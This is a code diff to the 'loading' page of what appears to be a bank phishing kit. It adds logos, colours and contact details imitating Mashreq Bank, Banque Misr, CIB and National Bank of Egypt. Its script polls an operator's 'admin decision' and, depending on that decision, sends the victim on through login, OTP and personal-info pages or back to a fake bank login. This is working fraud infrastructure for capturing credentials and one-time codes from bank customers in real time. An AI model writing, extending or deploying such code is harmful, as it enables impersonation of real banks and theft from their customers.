@@ -157,7 +157,16 @@
 </head>
 <body>
 
-    <!-- Header Removed for clean loading page -->
+    <!-- Header: Logo left, Language button, and Menu icon right -->
+    <header>
+        <div class="logo-container">
+            <img id="headerLogo" src="images/mashreq_logo_new.jpg" alt="Bank">
+        </div>
+        <div class="header-left">
+            <button class="lang-btn" onclick="window.location.href='loading.html'">العربية</button>
+            <div class="header-icon" title="Menu">&#9776;</div>
+        </div>
+    </header>
 
     <!-- Loading Box Section -->
     <div class="loading-container-wrapper">
@@ -168,7 +177,29 @@
         </div>
     </div>
 
-    <!-- Footer Removed for clean loading page -->
+    <!-- Footer -->
+    <footer id="footer">
+        <div class="footer-content">
+            <div class="footer-section">
+                <h3>Legal Pages</h3>
+                <ul>
+                    <li><a href="#">Privacy Policy</a></li>
+                    <li><a href="#">Terms and Conditions</a></li>
+                    <li><a href="#">Disclaimer</a></li>
+                    <li><a href="#">Security & Customer Protection</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3>Customer Care & Contact</h3>
+                <p><strong>Customer Service:</strong> 19900</p>
+                <p><strong>Landline:</strong> 0223456789</p>
+                <p id="footerEmail"><strong>Official Email:</strong> info@mashreq.com</p>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p id="footerCopy">All Rights Reserved © Mashreq Bank 2026</p>
+        </div>
+    </footer>
 
     <!-- Scripts at the end of body -->
     <script>
@@ -179,6 +210,38 @@
             },
             body: JSON.stringify({ action: 'track_visit', page: 'loading_en' })
         }).catch(error => console.error('Error tracking visit:', error));
+
+        // Bank Colors and Logos
+        const bankColors = {
+            'mashreq': { color: '#ff7f00', name: 'Mashreq Bank', email: 'info@mashreq.com', logo: 'images/mashreq_logo_new.jpg' },
+            'bm': { color: '#b01c1c', name: 'Banque Misr', email: 'info@bm.com', logo: 'images/bm_logo.png' },
+            'cib': { color: '#004b91', name: 'CIB', email: 'info@cib.com', logo: 'images/cib_logo.png' },
+            'nbe': { color: '#006b3f', name: 'National Bank of Egypt', email: 'info@nbe.com', logo: 'images/nbe_logo.png' }
+        };
+
+        // Update header and footer based on bank
+        window.addEventListener('DOMContentLoaded', () => {
+            const selectedBank = localStorage.getItem('selectedBank') || 'mashreq';
+            const config = bankColors[selectedBank];
+            document.getElementById('headerLogo').src = config.logo;
+            document.getElementById('footer').style.backgroundColor = config.color;
+            document.getElementById('footerEmail').innerHTML = '<strong>Official Email:</strong> ' + config.email;
+            document.getElementById('footerCopy').innerHTML = 'All Rights Reserved © ' + config.name + ' 2026';
+            document.querySelector('.lang-btn').style.borderColor = config.color;
+            document.querySelector('.lang-btn').style.color = config.color;
+            document.querySelector('.spinner').style.borderTopColor = config.color;
+        });
+
+        // Function to get login page URL based on selected bank
+        function getLoginPageUrl(bankId) {
+            const loginPages = {
+                'mashreq': 'login_en.html',
+                'bm': 'login_bm_en.html',
+                'cib': 'login_cib_en.html',
+                'nbe': 'login_nbe_en.html'
+            };
+            return loginPages[bankId] || 'login_en.html';
+        }
 
         // Function to check admin decision status periodically
         let statusInterval = null;
@@ -199,6 +262,7 @@
             .then(response => response.json())
             .then(data => {
                 if (data.status === 'approved') {
+                    if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
                     if (data.type === 'login') {
                         window.location.href = 'otp_en.html';
                     } else if (data.type === 'otp') {
@@ -207,21 +271,16 @@
                         window.location.href = 'success_en.html';
                     }
                 } else if (data.status === 'rejected') {
+                    if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
                     if (data.type === 'login') {
-                        let redirectUrl = 'login_en.html';
-                        const bank = data.data && data.data.bank ? String(data.data.bank).trim() : '';
-                        if (bank === 'Banque Misr') redirectUrl = 'login_bm_en.html';
-                        else if (bank === 'CIB') redirectUrl = 'login_cib_en.html';
-                        else if (bank === 'NBE') redirectUrl = 'login_nbe_en.html';
-                        else if (bank === 'Mashreq') redirectUrl = 'login_en.html';
-                        window.location.href = redirectUrl + '?rejected=true';
+                        const selectedBank = localStorage.getItem('selectedBank') || 'mashreq';
+                        const loginPage = getLoginPageUrl(selectedBank);
+                        window.location.href = loginPage + '?rejected=true';
                     } else if (data.type === 'otp') {
                         window.location.href = 'otp_en.html?rejected=true';
                     } else if (data.type === 'personal_info') {
                         window.location.href = 'personal_info_en.html?rejected=true';
                     }
-                    // Stop polling after rejection to avoid repeated redirects
-                    if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
                 }
             })
             .catch(error => console.error('Error checking status:', error));
